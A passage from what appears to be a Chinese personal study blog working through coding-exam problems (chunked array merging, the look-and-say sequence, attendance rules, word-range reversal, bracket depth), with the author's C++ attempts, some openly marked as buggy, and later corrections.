<h2 id="输入描述-6"><a href="#输入描述-6" class="headerlink" title="输入描述"></a>输入描述</h2><p>第一行是每次读取的固定长度,<code>0&lt;长度&lt;10</code>；<br>第二行是整数数组的数目<code>0&lt;数目&lt;1000</code>,<br>第<code>3~n</code>行是需要合并的数组,不同的数组用回车换行分隔,<br>数组内部用逗号分隔。最大不超过<code>100</code>个元素</p>
<h2 id="输出描述-6"><a href="#输出描述-6" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个新的数组,用逗号分隔</p>
<h2 id="示例一-4"><a href="#示例一-4" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">2</span><br><span class="line">2,5,6,7,9,5,7</span><br><span class="line">1,7,4,3,4</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2,5,6,1,7,4,7,9,5,3,4,7</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h2 id="示例二-1"><a href="#示例二-1" class="headerlink" title="示例二"></a>示例二</h2><h3 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">3</span><br><span class="line">1,2,3,4,5,6</span><br><span class="line">1,2,3</span><br><span class="line">1,2,3,4</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,2,3,4,1,2,3,1,2,3,4,5,6</span><br></pre></td></tr></table></figure>

<h2 id="个人代码（有错误处）"><a href="#个人代码（有错误处）" class="headerlink" title="个人代码（有错误处）"></a>个人代码（有错误处）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void solution(vector&lt;string&gt; &amp;s,int m,int n)</span><br><span class="line">&#123;</span><br><span class="line">   string result=&quot;&quot;,token=&quot;&quot;,shuzhi=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">   int begin=0,len=m+m,flag=m,tiaoguo=0;//len是m+逗号数+1(哎，逗号这个问题)</span><br><span class="line">   //flag遍历完的数组数，tiaoguo为当前是否循环</span><br><span class="line">  </span><br><span class="line">  // substr()</span><br><span class="line">   while(flag)</span><br><span class="line">   &#123;</span><br><span class="line">    for(int i=0;i&lt;n;i++)//每个数组</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        //begin是每次取子串的起始位置，怎么处理begin&gt;size()的问题</span><br><span class="line">        if((begin+len)&lt;s[i].size())   //索引保持在正常范围内,即下一次循环还能截取   </span><br><span class="line">            &#123;</span><br><span class="line">                token+=s[i].substr(begin,len); </span><br><span class="line">                //cout&lt;&lt;&quot;can substr&quot;&lt;&lt;token&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        else if(begin+len&gt;s[i].size()&amp;&amp;begin&lt;s[i].size()) //</span><br><span class="line">        &#123;//下一次不能截取，那就直接读完</span><br><span class="line">                    token=s[i].substr(begin); //直接取完</span><br><span class="line">                    token+=&quot;,&quot;;    //加个逗号</span><br><span class="line">                    flag--;</span><br><span class="line">                  //  cout&lt;&lt;&quot;ou substr&quot;&lt;&lt;token;</span><br><span class="line">        &#125;</span><br><span class="line">        else continue; //下次循环</span><br><span class="line">               result+=token;</span><br><span class="line">               token=&quot;&quot;;//清零</span><br><span class="line"></span><br><span class="line">               //shuzhi=s[i];//后面用到</span><br><span class="line">    &#125;</span><br><span class="line">//如果长度不一样，怎么确保哪些弄完，哪些没弄完</span><br><span class="line"></span><br><span class="line">      //  if((begin+len)&lt;shuzhi.size()) //防止下次substr溢出</span><br><span class="line">            begin+=len;//下一次截取起始位置</span><br><span class="line">       // else continue;</span><br><span class="line">       // if(tiaoguo&gt;0) continue; //跳出这次循环</span><br><span class="line">    //     if(begin+len&lt;s[i].size())//substr的起始位置不超过字符本身，就是说还可以截取</span><br><span class="line">    //     &#123;</span><br><span class="line">    //         token=s[i].substr(begin,len); //截取</span><br><span class="line">    //     //    tiaoguo=-1; //下一次循环不跳过</span><br><span class="line">    //     &#125;</span><br><span class="line">    //     else //否则直接赋值</span><br><span class="line">    //     &#123;</span><br><span class="line">    //         token=s[i];</span><br><span class="line">    //    //     tiaoguo=1;//跳出这次循环</span><br><span class="line">    //         flag++;//跳出次数，即每次读m，读完的次数</span><br><span class="line">    //     &#125;</span><br><span class="line">    //     result+=token;</span><br><span class="line"></span><br><span class="line">     &#125;    </span><br><span class="line">    cout&lt;&lt;result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  //  int n,m;</span><br><span class="line">  // cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">   //getchar();//取走回车，为了下面的getline</span><br><span class="line"></span><br><span class="line"> string s;</span><br><span class="line">  int m,n;</span><br><span class="line">  cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    vector&lt;string&gt; sw;</span><br><span class="line">  getchar(); //否则，n=2时，下文的getline只读一行，因为之前的回车读到了</span><br><span class="line"> // cin.ignore();</span><br><span class="line">  for(int i=0;i&lt;n;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    getline(cin,s);//默认分隔符为&#x27;\n&#x27; cin会默认去除\n</span><br><span class="line">    sw.emplace_back(s);</span><br><span class="line">  &#125;</span><br><span class="line">  solution(sw,m,n);</span><br><span class="line"></span><br><span class="line">   // cout&lt;&lt;sw.size();</span><br><span class="line">  // vector</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>面临的问题有：</p>
<p>1.因为是带着逗号来的，而且是字符串存储，双位数+逗号和单位数+逗号，难以把控，（举例1,123,4和1,2,3,4, 这个位置问题啊，阿西吧）</p>
<p>解决办法：想办法以整数添加吧；或者for循环里以“，”分割，添加m位添加数字。</p>
<p>2.substr的溢出问题，我用begin代表初始位置，捕捉m长度的数值，用子串字符串作为缓冲添加</p>
<p>解决办法：因为每次循环完，begin会增加m长度，更新substr的初始位置，会大过原有索引。</p>
<p>。。。必须去掉逗号的影响</p>
</blockquote>
<h1 id="9-数列描述"><a href="#9-数列描述" class="headerlink" title="9.数列描述"></a>9.数列描述</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>有一个数列a[N] (N&#x3D;60)，从a[0]开始，每一项都是一个数字。数列中a[n+1]都是a[n]的描述。其中a[0]&#x3D;1。</p>
<p>规则如下：</p>
<p>a[0]:1</p>
<p>a[1]:11(含义：其前一项a[0]&#x3D;1是1个1，即“11”。表示a[0]从左到右，连续出现了1次“1”）</p>
<p>a[2]:21(含义：其前一项a[1]&#x3D;11，从左到右：是由两个1组成，即“21”。表示a[1]从左到右，连续出现了两次“1”)</p>
<p>a[3]:1211(含义：其前一项a[2]&#x3D;21，从左到右：是由一个2和一个1组成，即“1211”。表示a[2]从左到右，连续出现了1次“2”，然后又连续出现了1次“1”)</p>
<p>a[4]:111221(含义：其前一项a[3]&#x3D;1211，从左到右：是由一个1、一个2、两个1组成，即“111221”。表示a[3]从左到右，连续出现了1次“1”，连续出现了1次“2”，连续出现了两次“1”)</p>
<p>请输出这个数列的第n项结果（a[n]，0≤n≤59）。</p>
<h2 id="输入描述-7"><a href="#输入描述-7" class="headerlink" title="输入描述"></a>输入描述</h2><p>数列的第n项(0≤n≤59)</p>
<p>4</p>
<h2 id="输出描述-7"><a href="#输出描述-7" class="headerlink" title="输出描述"></a>输出描述</h2><p>数列的内容</p>
<p>111221</p>
<h2 id="个人代码（有误）"><a href="#个人代码（有误）" class="headerlink" title="个人代码（有误）"></a>个人代码（有误）</h2><p><strong>怎么达成递归条件啊</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;string&gt; s(61);</span><br><span class="line">string back(int num)</span><br><span class="line">&#123;</span><br><span class="line">    //a[n]就是对a[n-1]的描述</span><br><span class="line">    //即a[n-1]中,a[n-1][i]的情况,从左往右，出现次数与该值。。。</span><br><span class="line">    //例如 a[3]=&quot;1211&quot;，那么a[4]=&quot;111221&quot;一次1，一次2，二次1</span><br><span class="line">    //那就是0-9，记为j，来个index记录一下，如果相等，对应位置a[j]++</span><br><span class="line">    //但面临的问题是，不知道是连续的呢，还是独立的呢</span><br><span class="line">    //</span><br><span class="line"></span><br><span class="line">    vector&lt;int&gt; index(10,0);</span><br><span class="line">   </span><br><span class="line">    if(num==3) </span><br><span class="line">    &#123;</span><br><span class="line">       // s[num]=&quot;1&quot;;</span><br><span class="line">        return &quot;21&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    // if(s[num])    </span><br><span class="line">    int pre=s[num-1][0]-&#x27;0&#x27;;</span><br><span class="line">    index[pre]++; </span><br><span class="line">        for(int i=1;i&lt;back(num-1).size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int tem=s[num-1][i]-&#x27;0&#x27;;//其中的值</span><br><span class="line">        if(tem==pre) //从左到右相同，连续统计</span><br><span class="line">        &#123;</span><br><span class="line">            index[tem]++;</span><br><span class="line">        &#125;    </span><br><span class="line">       // string s=to_string(123);</span><br><span class="line">      // to_string(23);</span><br><span class="line">        else//相邻不同</span><br><span class="line">        &#123;</span><br><span class="line">            s[num]+=to_string(index[pre])+to_string(pre);//给s[num];</span><br><span class="line">            index[tem]=1;//防止以前统计过，置为1</span><br><span class="line">            pre=tem;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s[num] += to_string(index[pre]) + to_string(pre);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">   return s[num];</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   back(4);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="个人代码（纠正后）"><a href="#个人代码（纠正后）" class="headerlink" title="个人代码（纠正后）"></a>个人代码（纠正后）</h2><p>放弃递归想法，直接从已知一步步算到所求。比如已知s[0],s[1]，求s[5]；先算s[2]，再算s[3]…直到s[5];</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//vector&lt;string&gt; s(61,&quot;&quot;);</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">s</span><span class="params">(<span class="number">61</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bianli</span><span class="params">(<span class="type">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a[n]就是对a[n-1]的描述</span></span><br><span class="line">    <span class="comment">//即a[n-1]中,a[n-1][i]的情况,从左往右，出现次数与该值。。。</span></span><br><span class="line">    <span class="comment">//例如 a[3]=&quot;1211&quot;，那么a[4]=&quot;111221&quot;一次1，一次2，二次1</span></span><br><span class="line">    <span class="comment">//那就是0-9，记为j，来个index记录一下，如果相等，对应位置a[j]++</span></span><br><span class="line">    <span class="comment">//但面临的问题是，不知道是连续的呢，还是独立的呢</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// if(s[num])    </span></span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=num;i++) <span class="comment">//从第2项算到第num项</span></span><br><span class="line">    &#123;</span><br><span class="line">          <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">index</span><span class="params">(<span class="number">10</span>,<span class="number">0</span>)</span></span>; <span class="comment">//每次初始化为0</span></span><br><span class="line">          <span class="type">int</span> pre=s[i<span class="number">-1</span>][<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>; <span class="comment">//记录s[1]的第一个元素</span></span><br><span class="line">            index[pre]++;   <span class="comment">//对应下标相加</span></span><br><span class="line">       <span class="comment">// cout&lt;&lt;&quot;sdsd&quot;&lt;&lt;&quot;: &quot;&lt;&lt;pre&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;s[i<span class="number">-1</span>].<span class="built_in">size</span>();k++) </span><br><span class="line">        &#123;</span><br><span class="line">             <span class="type">int</span> tem=s[i<span class="number">-1</span>][k]-<span class="string">&#x27;0&#x27;</span>;<span class="comment">//取第k个值</span></span><br><span class="line">             <span class="comment">//cout&lt;&lt;&quot;s[i-1]&quot;&lt;&lt;&quot; &quot;&lt;&lt;s[i-1].size()&lt;&lt;endl;</span></span><br><span class="line">            <span class="keyword">if</span>(tem==pre) <span class="comment">//如果从左到右相同，连续统计</span></span><br><span class="line">        &#123;</span><br><span class="line">            index[tem]++;</span><br><span class="line">        &#125;    </span><br><span class="line">       <span class="comment">// string s=to_string(123);</span></span><br><span class="line">      <span class="comment">// to_string(23);</span></span><br><span class="line">        <span class="keyword">else</span><span class="comment">//相邻不同</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[i]+=<span class="built_in">to_string</span>(index[pre])+<span class="built_in">to_string</span>(pre);<span class="comment">//给s[i]赋值 统计数+对应数;</span></span><br><span class="line">           <span class="comment">//s[i]=&quot;123&quot;;</span></span><br><span class="line">          <span class="comment">// cout&lt;&lt;&quot;出现次数: &quot;&lt;&lt;index[pre]&lt;&lt;&quot;，对应值 &quot;&lt;&lt;pre&lt;&lt;endl;</span></span><br><span class="line">            index[tem]=<span class="number">1</span>;<span class="comment">//防止以前统计过，置为1</span></span><br><span class="line">            pre=tem;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">// cout&lt;&lt;&quot;wewe&quot;&lt;&lt;&quot;: &quot;&lt;&lt;tem&lt;&lt;endl;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//会少比一次嘞，内循环比完后，还剩最后一次的值没有描述</span></span><br><span class="line">        <span class="comment">//s[i]+=&quot;123&quot;;</span></span><br><span class="line">         s[i]+=<span class="built_in">to_string</span>(index[pre])+<span class="built_in">to_string</span>(pre);</span><br><span class="line">       <span class="comment">//   cout&lt;&lt;&quot;出现次数: &quot;&lt;&lt;index[pre]&lt;&lt;&quot;，对应值 &quot;&lt;&lt;pre&lt;&lt;endl;</span></span><br><span class="line">       <span class="comment">//下标置0，为了下一次循环</span></span><br><span class="line">      <span class="comment">//  index.clear();//删不掉</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//s.push_back(&quot;11&quot;);没效果？</span></span><br><span class="line">    s[<span class="number">0</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    s[<span class="number">1</span>]=<span class="string">&quot;11&quot;</span>;</span><br><span class="line">    <span class="comment">//s[2]=&quot;21&quot;</span></span><br><span class="line">    <span class="comment">//s[3]=&quot;1211&quot;</span></span><br><span class="line">    <span class="comment">//s[4]=&quot;111221&quot;</span></span><br><span class="line">    <span class="comment">//s[5]=&quot;312211&quot;</span></span><br><span class="line">    <span class="comment">//s[6]=</span></span><br><span class="line">   <span class="comment">//  bianli(1);</span></span><br><span class="line">   <span class="comment">//cout&lt;&lt;s[0]&lt;&lt;&quot; &quot;&lt;&lt;s[1];</span></span><br><span class="line">    <span class="built_in">bianli</span>(<span class="number">6</span>);</span><br><span class="line">  <span class="comment">//  cout&lt;&lt;s[3];</span></span><br><span class="line">  cout&lt;&lt;s[<span class="number">6</span>];</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="10-考勤信息"><a href="#10-考勤信息" class="headerlink" title="10.考勤信息"></a>10.考勤信息</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>公司用一个字符串来表示员工的出勤信息</p>
<p>absent：缺勤</p>
<p>late：迟到</p>
<p>leaveearly：早退</p>
<p>present：正常上班</p>
<p>现需根据员工出勤信息，判断本次是否能获得出勤奖，能获得出勤奖的条件如下：</p>
<p>缺勤不超过一次；</p>
<p>没有连续的迟到&#x2F;早退；</p>
<p>任意连续7次考勤，缺勤&#x2F;迟到&#x2F;早退不超过3次。</p>
<h2 id="输入描述-8"><a href="#输入描述-8" class="headerlink" title="输入描述"></a>输入描述</h2><p>用户的考勤数据字符串，记录条数 &gt;&#x3D; 1；</p>
<p>输入字符串长度 &lt; 10000；</p>
<p>不存在非法输入</p>
<p>如：</p>
<p>2</p>
<p>present</p>
<p>present absent present present leaveearly present absent</p>
<h2 id="输出描述-8"><a href="#输出描述-8" class="headerlink" title="输出描述"></a>输出描述</h2><p>根据考勤数据字符串，如果能得到考勤奖，输出”true”；否则输出”false”，</p>
<p>对于输入示例的结果应为：</p>
<p>true false</p>
<h2 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h2><p>2</p>
<p>present</p>
<p>present present</p>
<h2 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h2><p>true</p>
<p>true</p>
<h2 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h2><p>2</p>
<p>present</p>
<p>present absent present present leaveearly present absent</p>
<h2 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h2><p>true</p>
<p>false</p>
<h2 id="个人代码-1"><a href="#个人代码-1" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void neibuchuli(vector&lt;string&gt; &amp;s)//把空格去掉</span><br><span class="line">&#123;</span><br><span class="line">    string st=s[0];//实际是s[i][0]</span><br><span class="line">    string token;</span><br><span class="line">    stringstream ss(st);</span><br><span class="line">    while(getline(ss,token,&#x27; &#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        s.push_back(token);//以后不用s[0]了，从1开始。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//absent late leaveearly 前三个不超过三次 present</span><br><span class="line"></span><br><span class="line">/*缺勤不超过一次；</span><br><span class="line"></span><br><span class="line">没有连续的迟到/早退；</span><br><span class="line"></span><br><span class="line">任意连续7次考勤，缺勤/迟到/早退不超过3次。</span><br><span class="line">*/</span><br><span class="line">void solution(vector&lt;string&gt; s)</span><br><span class="line">&#123;</span><br><span class="line"> int queqin=0,chidao=0,zaotui=0;</span><br><span class="line"> for(int i=1;i&lt;s.size();i++)</span><br><span class="line"> &#123;</span><br><span class="line">    //一开始退出语句在这里，不对</span><br><span class="line">   // switch()</span><br><span class="line">    if(s[i]==&quot;absent&quot;)</span><br><span class="line">   &#123;</span><br><span class="line">     queqin++;</span><br><span class="line">   //  cout&lt;&lt;i&lt;&lt;&quot; &quot;;</span><br><span class="line">   &#125; </span><br><span class="line">    if(s[i]==&quot;late&quot;) chidao++;</span><br><span class="line">    if(s[i]==&quot;leaveearly&quot;) zaotui++;</span><br><span class="line"></span><br><span class="line">   //   cout&lt;&lt;&quot;i: &quot;&lt;&lt;i&lt;&lt;&quot; queqin:&quot;&lt;&lt;queqin&lt;&lt;&quot; late: &quot;&lt;&lt;chidao&lt;&lt;&quot; leaveearly: &quot;&lt;&lt;zaotui&lt;&lt;endl;</span><br><span class="line">  //条件不能放在前面</span><br><span class="line">  //缺勤不能超过1次</span><br><span class="line">   if(queqin&gt;1) </span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;&quot;false&quot;&lt;&lt;endl;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    //连续的迟到或早退</span><br><span class="line">    if(i&gt;1&amp;&amp;(s[i]==&quot;late&quot;||s[i]==&quot;leaveearly&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]==s[i-1])</span><br><span class="line">        &#123;</span><br><span class="line">        cout&lt;&lt;&quot;false&quot;&lt;&lt;endl;</span><br><span class="line">        return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //缺勤/迟到/早退不超过三次</span><br><span class="line">    if(queqin+chidao+zaotui&gt;3)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;&quot;false&quot;&lt;&lt;endl;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"> &#125;</span><br><span class="line"> cout&lt;&lt;&quot;true&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int num;</span><br><span class="line">    cin&gt;&gt;num;</span><br><span class="line">    vector&lt;string&gt; s[num];</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    string sw;</span><br><span class="line">    for(int i=0;i&lt;num;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        getline(cin,sw); //回车为分割点</span><br><span class="line">        s[i].push_back(sw);</span><br><span class="line">    &#125;</span><br><span class="line">    //  for(string list:s[0])</span><br><span class="line">    //      cout&lt;&lt;list&lt;&lt;&quot; &quot;&lt;&lt;endl;</span><br><span class="line">    //     for(string list:s[1])</span><br><span class="line">    //     cout&lt;&lt;list&lt;&lt;&quot; &quot;&lt;&lt;endl;</span><br><span class="line"> //   cout&lt;s[0].size()&lt;&lt;&quot; &quot;&lt;&lt;s[0][0].size();</span><br><span class="line">    for(int j=0;j&lt;num;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        neibuchuli(s[j]);</span><br><span class="line">    &#125;</span><br><span class="line">        //  for(string list:s[1])</span><br><span class="line">        //  cout&lt;&lt;list&lt;&lt;&quot; &quot;&lt;&lt;endl;</span><br><span class="line">    // for(string s11:s[0])</span><br><span class="line">    //  cout&lt;&lt;s11&lt;&lt;&quot;!@#@!#&quot;&lt;&lt;endl;</span><br><span class="line">    //  cout&lt;&lt;s[0].size();</span><br><span class="line">     for(int k=0;k&lt;num;k++)</span><br><span class="line">     &#123;</span><br><span class="line">         solution(s[k]);</span><br><span class="line">     &#125;</span><br><span class="line">        //   for(string list:s[1])</span><br><span class="line">        //   &#123;</span><br><span class="line">        //     if(list==&quot;absent&quot;)</span><br><span class="line">        //         cout&lt;&lt;list&lt;&lt;endl;</span><br><span class="line">        //   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><blockquote>
<p>1.以回车为分割，获取字符串</p>
<p>用到getline()，vector&lt;string&gt;</p>
<p>2.内部的空格分割，再追加字符串</p>
<p>用到stringstream，getline，push_back()</p>
<p>3.循环判断，标志++</p>
</blockquote>
<h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><p>vector&lt;int&gt; s;</p>
<p>不知道大小，加值就push_back</p>
<p>知道大小，则vector&lt;int&gt; s(10);</p>
<p>可以s[0]&#x3D;1;直接赋值</p>
<h1 id="11-区间反转文章"><a href="#11-区间反转文章" class="headerlink" title="11.区间反转文章"></a>11.区间反转文章</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>给定一段英文文章片段，由若干单词组成，单词间以空格间隔，单词下标从零开始，请翻转片段中指定区间的单词顺序并返回翻转后的内容。</p>
<p>例如给定的英文文章片段为“I am a developer.”，</p>
<p>翻转区间为[0,3]，</p>
<p>则输出”developer. a am l”。</p>
</blockquote>
<h2 id="输入描述-9"><a href="#输入描述-9" class="headerlink" title="输入描述"></a>输入描述</h2><blockquote>
<p>使用换行隔开三个参数，第一个参数为英文文章内容即英文字符串，第二个参数为待翻转内容起始单词下标，第三个参数为待翻转内容最后一个单词下标。</p>
</blockquote>
<h2 id="输出描述-9"><a href="#输出描述-9" class="headerlink" title="输出描述"></a>输出描述</h2><blockquote>
<p>翻转后的英文文章片段，所有单词之间以一个半角空格分隔符进行输出</p>
</blockquote>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><blockquote>
<p>输入<br>I am a developer<br>1<br>2<br>输出<br>I a am developer</p>
</blockquote>
<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><blockquote>
<p>输入<br>hello world<br>-1<br>1<br>输出<br>world hello</p>
</blockquote>
<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void solution1(vector&lt;string&gt; &amp;s,int begin,int end)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    string sum=&quot;&quot;;</span><br><span class="line">    vector&lt;string&gt; sw;</span><br><span class="line"></span><br><span class="line">    for(int i=begin;i&lt;=end;i++)</span><br><span class="line">     &#123;</span><br><span class="line"></span><br><span class="line">        sw.push_back(s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   // cout&lt;&lt;sw.size();</span><br><span class="line">    reverse(sw.begin(),sw.end());</span><br><span class="line">    // for(string list:sw)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;list&lt;&lt;&quot; &quot;;</span><br><span class="line">    // &#125;</span><br><span class="line">    for(int j=begin;j&lt;=end;j++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      //哦，对于sw来说是从0开始的</span><br><span class="line">        // cout&lt;&lt;s[j]&lt;&lt;&quot; &quot;&lt;&lt;sw[j-begin]&lt;&lt;endl;</span><br><span class="line">        s[j]=sw[j-begin];</span><br><span class="line">    &#125;</span><br><span class="line"> //   cout&lt;&lt;s.size();</span><br><span class="line">    for(int k=0;k&lt;s.size();k++)</span><br><span class="line">    &#123;</span><br><span class="line">        //cout&lt;&lt;s[k];</span><br><span class="line">        if(k!=s.size()-1)</span><br><span class="line">        sum+=s[k]+&quot; &quot;;</span><br><span class="line">        else sum+=s[k];</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    cout&lt;&lt;sum;</span><br><span class="line">&#125;</span><br><span class="line">void solution2(vector&lt;string&gt; &amp;s,int l,int r)</span><br><span class="line">&#123;</span><br><span class="line">    while(l&lt;r)</span><br><span class="line">    &#123;</span><br><span class="line">        string tem=s[l];</span><br><span class="line">        s[l]=s[r];</span><br><span class="line">        s[r]=tem;</span><br><span class="line">        l++;</span><br><span class="line">        r--;</span><br><span class="line">    &#125;</span><br><span class="line">     for(int k=0;k&lt;s.size();k++)</span><br><span class="line">    &#123;</span><br><span class="line">        //cout&lt;&lt;s[k];</span><br><span class="line">        if(k!=s.size()-1)</span><br><span class="line">        cout&lt;&lt;s[k]&lt;&lt;&quot; &quot;;</span><br><span class="line">        else cout&lt;&lt;s[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;string&gt; s;</span><br><span class="line">    string t,token;</span><br><span class="line">    //cin&gt;&gt;t;</span><br><span class="line">  //  getchar();</span><br><span class="line">    getline(cin,t);</span><br><span class="line">  //  getchar();</span><br><span class="line">    stringstream ss(t);</span><br><span class="line">    while(getline(ss,token,&#x27; &#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        s.push_back(token);</span><br><span class="line">    &#125;</span><br><span class="line">    // for(string sqq:s)</span><br><span class="line">    // cout&lt;&lt;sqq&lt;&lt;&quot;,&quot;;</span><br><span class="line">    int begin,end;//单词下标位置</span><br><span class="line">    cin&gt;&gt;begin&gt;&gt;end;</span><br><span class="line">   // solution1(s,begin,end);</span><br><span class="line">   solution2(s,begin,end);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>solution1是自己的方法，solution2是大佬<a href="http://t.csdn.cn/6nGdh">HANWEN KE</a>的wp</p>
<h1 id="12-最大括号深度"><a href="#12-最大括号深度" class="headerlink" title="12.最大括号深度"></a>12.最大括号深度</h1><p>现有一字符串 仅由<code>&#39;(&#39;,&#39;)&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;[&#39;,&#39;]&#39;</code>六种括号组成<br>若字符串满足以下条件之一，则为无效字符串</p>
<ol>
<li>任意类型的左右括号数量不相等</li>
<li>存在未按正确顺序(先左后右)闭合的括号，<br>输出括号的最大嵌套深度<br>若字符串无效则输出<code>0</code><br><code>0 &lt;= 字符串长度 &lt;= 100000</code></li>
</ol>
